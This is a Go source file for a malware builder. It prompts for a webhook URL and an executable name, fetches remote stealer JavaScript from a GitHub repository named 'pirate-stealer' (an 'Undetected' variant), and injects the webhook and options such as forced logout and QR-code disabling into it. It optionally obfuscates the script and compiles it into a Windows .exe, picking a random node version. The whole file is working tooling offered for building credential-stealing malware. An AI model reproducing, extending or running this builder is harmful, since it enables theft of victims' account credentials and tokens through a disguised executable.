package main

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"math/rand"
	"net/http"
	"os"
	"os/exec"
	"strings"
	"time"

)

var (
	webhook string
	cfg     Config
	name    string
)

type Config struct {
	Platform      []string `json:"platform"`
	Obfuscate     bool     `json:"obfuscate"`
	Logout        string   `json:"logout"`
	InjectNotify  string   `json:"inject-notify"`
	LogoutNotify  string   `json:"logout-notify"`
	InitNotify    string   `json:"init-notify"`
	DisableQrCode string   `json:"disable-qr-code"`
	EmbedColor    string   `json:"embed-color"`
}

func init() {
	cfg = loadConfig("config.json")
	Error("\nYour Config (see config.txt for options and help):\n", fmt.Sprintf(`Platforms: %s Obfuscate (WARNING: experimental, always test it before using the grabber, we won't fix bugs you had if you used obfuscation :Instant feature may break often): %s Logout: %s Disable-qr-code: %s InjectNotify: %s LogoutNotify: %s InitNotify: %s Embed Color: %s`,
		fmt.Sprint(cfg.Platform)+"\n",
		fmt.Sprint(cfg.Obfuscate)+"\n",
		cfg.Logout+"\n",
		cfg.DisableQrCode+"\n",
		cfg.InjectNotify+"\n",
		cfg.LogoutNotify+"\n",
		cfg.InitNotify+"\n",
		cfg.EmbedColor+"\n"))
}

func main() {
	Info("Enter Webhook URL:")
	fmt.Scanln(&webhook)
	Info("Enter exe name:")
	fmt.Scanln(&name)
	switch {
	case !strings.Contains(name, ".exe"):
		name = name + ".exe"
	}
	buildPlatform()
}

func loadConfig(file string) Config {
	var config Config
	cfg, err := os.Open(file)
	if err != nil {
		Error(err.Error())
	}
	defer cfg.Close()

	jsonP := json.NewDecoder(cfg)
	jsonP.Decode(&config)
	return config
}

func cfgChanges(data []byte) string {
	d := string(data)
	// Logout
	switch cfg.Logout {
	case "instant":
		d = replace(d, "%LOGOUT%1", "instant")
	case "delayed":
		d = replace(d, "%LOGOUT%1", "delayed")
	case "false":
		d = replace(d, "%LOGOUT%1", "false")
	default:
		d = replace(d, "%LOGOUT%1", "instant")
	}
	// DisableQrCode
	switch cfg.DisableQrCode {
	case "true":
		d = replace(d, "%DISABLEQRCODE%1", "true")
	case "false":
		d = replace(d, "%DISABLEQRCODE%1", "false")
	default:
		d = replace(d, "%DISABLEQRCODE%1", "false")
	}
	// InjectNotify
	switch cfg.InjectNotify {
	case "true":
		d = replace(d, "%INJECTNOTI%1", "true")
	case "false":
		d = replace(d, "%INJECTNOTI%1", "false")
	default:
		d = replace(d, "%INJECTNOTI%1", "false")
	}
	// LogoutNotify
	switch cfg.LogoutNotify {
	case "true":
		d = replace(d, "%LOGOUTNOTI%1", "true")
	case "false":
		d = replace(d, "%LOGOUTNOTI%1", "false")
	default:
		d = replace(d, "%LOGOUTNOTI%1", "false")
	}
	// INITNOTI
	switch cfg.InitNotify {
	case "true":
		d = replace(d, "%INITNOTI%1", "true")
	case "false":
		d = replace(d, "%INITNOTI%1", "false")
	default:
		d = replace(d, "%INITNOTI%1", "false")
	}
	// Embed Color
	switch {
	case cfg.EmbedColor != "3447704":
		d = replace(d, "%MBEDCOLOR%1", cfg.EmbedColor)
	default:
		d = replace(d, "%MBEDCOLOR%1", "3447704")
	}

	d = replace(d, "da_webhook", webhook)
	return d
}

func replace(s, old, new string) string {
	return strings.Replace(s, old, new, -1)
}

func buildPlatform() {
	rand.Seed(time.Now().Unix())
	for _, platform := range cfg.Platform {

		switch platform {
		case "windows":

			Info("Starting to compile")
			// Check for node
			_, err := exec.Command("node", "-v").Output()
			if err != nil {
				Fatal("You must have node installed and added to your ENVIRONMENT VARIABLES (PATH) in order to use this program. see: https://nodejs.org/en/download/  | Will exit in 5 seconds", err)
				time.Sleep(5 * time.Second)
				os.Exit(1)
			}
			Info("Installing deps")

			// Install dependencies
			_, err = exec.Command("npm", "install").Output()
			if err != nil {
				Fatal("Please make sure package.json and package-lock.json are in the same folder that the .exe | Will exit in 5 seconds", err)
				time.Sleep(5 * time.Second)
				os.Exit(1)
			}
			// Check pkg
			_, err = exec.Command("nexe", "-v").Output()
			if err != nil {
				Info("Installing nexe")
				_, err = exec.Command("npm", "install", "-g", "nexe").Output()
				if err != nil {
					Fatal(`Error while installing nexe, "npm install -g nexe", run this command in cmd please. Will exit in 5 seconds`, err)
					time.Sleep(5 * time.Second)
					os.Exit(1)
				}
			}
			Info("Building Windows")
			wincode := getCode("https://raw.githubusercontent.com/jimisreallynoobyrn/pirate-stealer-by-bytixo/main/src/Undetected/index-win.js")
			err = ioutil.WriteFile("index-win.js", []byte(wincode), 0666)
			if err != nil {
				Fatal("Error writing to file", err)
			}
			if cfg.Obfuscate {
				Info("Obfuscating ...")
				_, err := exec.Command("javascript-obfuscator", "-v").Output()
				if err != nil {
					Fatal("Installing javascript-obfuscator", err)
					_, err = exec.Command("npm", "install", "-g", "javascript-obfuscator").Output()
					if err != nil {
						Fatal(`Error while installing javascript-obfuscator, "npm install -g javascript-obfuscator", run this command in cmd please. Will exit in 5 seconds`, err)
						time.Sleep(5 * time.Second)
						os.Exit(1)
					}
				}
				out, err := exec.Command("javascript-obfuscator", "index-win.js", "--config", "obf-config.json", "--output", "output.js").Output()
				if err != nil {
					Fatal("Error with Obfuscator", err)
				}
				Info(fmt.Sprintf(`Out Obf Command: %s`, out))
				time.Sleep(time.Second)
				versions := []string{"win32-x64-14.15.3", "win32-x64-14.15.1"}
				v := versions[rand.Intn(len(versions))]
				t := fmt.Sprintf(`-t %s`, v)
				Info(fmt.Sprintf(`Compiling: nexe %s -o %s output.js`, t, name))
				_, err = exec.Command("nexe", "-t", v, "-r", "node_modules/", "-o", name, "output.js").Output()
				if err != nil {
					Fatal("Error while compiling", err)
					time.Sleep(5 * time.Second)
					os.Exit(1)
				}

				err = os.RemoveAll("output.js")
				if err != nil {
					Info("Error while removing file", err)
				}

			} else {
				time.Sleep(time.Second)
				versions := []string{"win32-x64-14.15.3", "win32-x64-14.15.1"}
				v := versions[rand.Intn(len(versions))]
				t := fmt.Sprintf(`-t %s`, v)
				Info(fmt.Sprintf(`Compiling: nexe %s -o %s index-win.js`, t, name))
				_, err = exec.Command("nexe", "-t", v, "-o", name, "index-win.js").Output()
				if err != nil {
					Fatal("Error while compiling", err)
					time.Sleep(5 * time.Second)
					os.Exit(1)
				}
			}
			Info("Windows Executable has been built with your webhook")
			time.Sleep(time.Second * 5)

		}
	}
}

func getCode(url string) string {
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		Fatal(err)
	}

	httpClient := http.Client{
		Timeout: 5 * time.Second,
	}

	resp, err := httpClient.Do(req)
	if err != nil {
		Fatal(err)
	}
	defer resp.Body.Close()
	r, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		Error(err)
	}
	//replace webhook
	c := cfgChanges(r)
	return c
}
